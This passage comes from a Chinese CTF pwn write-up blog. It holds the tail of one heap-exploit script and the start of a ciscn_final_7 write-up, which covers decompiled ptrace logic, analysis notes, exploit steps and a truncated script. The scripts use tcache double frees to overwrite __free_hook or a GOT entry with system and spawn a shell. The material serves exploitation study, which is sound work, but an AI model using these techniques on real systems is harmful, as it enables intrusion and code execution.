class="number">1</span>:<span class="number">-1</span>]) <span class="keyword">for</span> item <span class="keyword">in</span> maze][<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> maze:</span><br><span class="line">        print(<span class="string">''</span>.join(item))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># from maze[1][0] ==&gt; maze[40, 41]</span></span><br><span class="line">    sol = []</span><br><span class="line">    solve(maze, (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">40</span>, <span class="number">41</span>), sol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(sol[::<span class="number">-1</span>])</span><br><span class="line">    </span><br><span class="line">malloc_offset = libc.sym[<span class="string">"malloc"</span>]</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf1147</span></span><br><span class="line">one_gadget_offset = <span class="number">0xf02a4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get malloc address</span></span><br><span class="line">res = solve_maze()</span><br><span class="line">new(<span class="string">"0"</span>, len(res) + <span class="number">1</span>, res)</span><br><span class="line">p.recvuntil(<span class="string">"Here's the award:0x"</span>)</span><br><span class="line">libc_malloc = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_malloc - malloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line"><span class="comment"># since there is also double free in tcache bin 0x30 and 0x20</span></span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin double free</span></span><br><span class="line"><span class="comment"># new("1", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("2", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># load(1, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># store(False, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="string">"1"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"\n"</span>)</span><br><span class="line">load(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write __malloc_hook (for fastbin double free)</span></span><br><span class="line"><span class="comment"># new("3", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, p64(__malloc_hook - 0x23) + "\n")</span></span><br><span class="line"><span class="comment"># new("4", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("5", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("6", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "A" * 0x13 + p64(one_gadget) + '\n')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="string">"3"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">new(<span class="string">"5"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">new(<span class="string">"6"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __free_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-7"><a href="#ciscn-final-7" class="headerlink" title="ciscn_final_7"></a>ciscn_final_7</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>强迫症驱使我把这个ciscn_final_7没做的空白填满，结果硬是断断续续地写了我两天，完了作业写不完了。<del>pwn使我失去理智。</del></p><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><ol><li>拖到IDA一看，父进程<code>fork</code>一个子进程，通过<code>ptrace</code>对子进程进行控制，代码的主要逻辑都在子进程中。同时因为子进程被父进程<code>ptrace</code>了，所以应该是不可能直接调试子进程了。</li><li>学一波<code>ptrace</code>的用法，大概了解之后，看一下父进程是怎么控制子进程的: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_401582</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __WAIT_STATUS stat_loc; <span class="comment">// [rsp+18h] [rbp-2A8h]</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+20h] [rbp-2A0h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-29Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-298h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-294h]</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+30h] [rbp-290h]</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-28Ch]</span></span><br><span class="line">    __int64 v9; <span class="comment">// [rsp+38h] [rbp-288h]</span></span><br><span class="line">    <span class="keyword">char</span> v10; <span class="comment">// [rsp+40h] [rbp-280h]</span></span><br><span class="line">    __int64 v11; <span class="comment">// [rsp+C0h] [rbp-200h]</span></span><br><span class="line">    __int64 v12; <span class="comment">// [rsp+D8h] [rbp-1E8h]</span></span><br><span class="line">    __int64 v13[<span class="number">51</span>]; <span class="comment">// [rsp+120h] [rbp-1A0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+2B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(stat_loc.__iptr) = <span class="number">0</span>;</span><br><span class="line">    qword_604948 = (__int64)qword_604960;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    <span class="keyword">while</span> ( LOBYTE(stat_loc.__uptr) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v10);</span><br><span class="line">        v7 = ptrace(PTRACE_PEEKTEXT, a1, v11, <span class="number">0L</span>L);</span><br><span class="line">        v9 = (<span class="keyword">unsigned</span> __int8)ptrace(PTRACE_PEEKDATA, a1, v11 - <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="number">0xCC</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ptrace(PTRACE_KILL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)(qword_604948 + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v8 = (*(__int64 (__fastcall **)(<span class="keyword">char</span> *))(qword_604948 + <span class="number">16</span>))(&amp;v10);</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> ( v8 )</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &lt;= <span class="number">0</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                qword_604948 = v13[--HIDWORD(stat_loc.__iptr)];</span><br><span class="line">                v12 += <span class="number">8L</span>L;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v11 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                ptrace(PTRACE_POKEDATA, a1, v12, *(_QWORD *)(qword_604948 + <span class="number">24</span>));</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                v4 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">136</span>; ++i )</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">if</span> ( qword_604978[<span class="number">4</span> * i] == v11 )</span><br><span class="line">                &#123;</span><br><span class="line">                    qword_604948 = (__int64)&amp;qword_604960[<span class="number">4</span> * i];</span><br><span class="line">                    v4 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v4 )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">            v11 = *(_QWORD *)(qword_604948 + <span class="number">24</span>);</span><br><span class="line">        ptrace(PTRACE_SETREGS, a1, <span class="number">0L</span>L, &amp;v10); <span class="comment">// set regs</span></span><br><span class="line">        <span class="keyword">if</span> ( ptrace(PTRACE_CONT, a1, <span class="number">0L</span>L, <span class="number">0L</span>L) &lt; <span class="number">0</span> ) <span class="comment">// let child process continue</span></span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">"ptrace"</span>);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">        &#125;</span><br><span class="line">        wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>前面一堆<code>switch</code>啥的就不管了，重点在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，因为设置完寄存器之后，就是通过<code>ptrace(PTRACE_CONT, a1, 0LL, 0LL)</code>把执行权限还给子进程了。</li><li>gdb动态调试，断在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，查看第四个参数也就是<code>rcx</code>指向的位置，这是一个<code>user_regs_struce</code>的结构体（在”/user/include/sys/user.h”可以找到定义）： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r15;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r14;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r13;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r12;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r11;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r10;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r9;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r8;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rcx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> orig_rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rip;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> cs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> eflags;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ss;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ds;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> es;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>然后就是根据<code>rip</code>去binary里找汇编码，因为都是一段一段的，然后通过<code>int 3</code>返回父进程。所以就只能对着汇编码，借助寄存器的值，手动分析子进程的执行逻辑。</li><li>细节就不赘述了（感觉这种方法有点笨，如果有大佬能提供更好的方法，希望可以教教我），分析的结果如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function list:</span><br><span class="line">    110 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : size </span><br><span class="line">            second input after &quot;string: &quot; : content (end with &quot;\n&quot;)</span><br><span class="line">            chunk will be added to global variable &quot;chunk_array&quot;</span><br><span class="line">    119 &#x3D;&#x3D;&gt; no use at all, simply &quot;puts(&quot;sorry~\n&quot;);&quot; after input done</span><br><span class="line">    120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">    238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">            free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">            thus bring double free)</span><br><span class="line">    386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">some global variable:</span><br><span class="line">    0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">    0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">    0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">some constraints:</span><br><span class="line">    chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">    can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">    for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">    &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br></pre></td></tr></table></figure></li><li>程序没有开PIE。</li><li>首先用tcache double free，把<code>0x6040E0</code>处的值（可以执行<code>free</code>操作的次数）改大一点。</li><li>再此利用tcache double free，把<code>0x605AC0</code>改到bss上，达到清空<code>chunk_array</code>的目的，从而又能分配10个chunk</li><li>由于<code>free</code>限制解除了，再利用double free改<code>atoi_got</code>为<code>printf_plt</code>，从而利用fsb来leak栈上的libc地址。</li><li>最后double free改<code>atoi_got</code>为<code>system</code>，输入”/bin/sh”来getshell。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content, trans=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> trans == <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"%110c"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, <span class="string">"%"</span> + str(size) + <span class="string">"c"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"110"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"string:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content, trans=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> trans == <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"%120c"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, <span class="string">"%"</span> + str(index) + <span class="string">"c"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"120"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"string:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index, trans=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> trans == <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"%238c"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, <span class="string">"%"</span> + str(index) + <span class="string">"c"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"238"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"string:"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">function list:</span></span><br><span class="line"><span class="string">    110 ==&gt; first input after "string: " : size </span></span><br><span class="line"><span class="string">            second input after "string: " : content (end with "\n")</span></span><br><span class="line"><span class="string">            chunk will be added to global variable "chunk_array"</span></span><br><span class="line"><span class="string">    119 ==&gt; no use 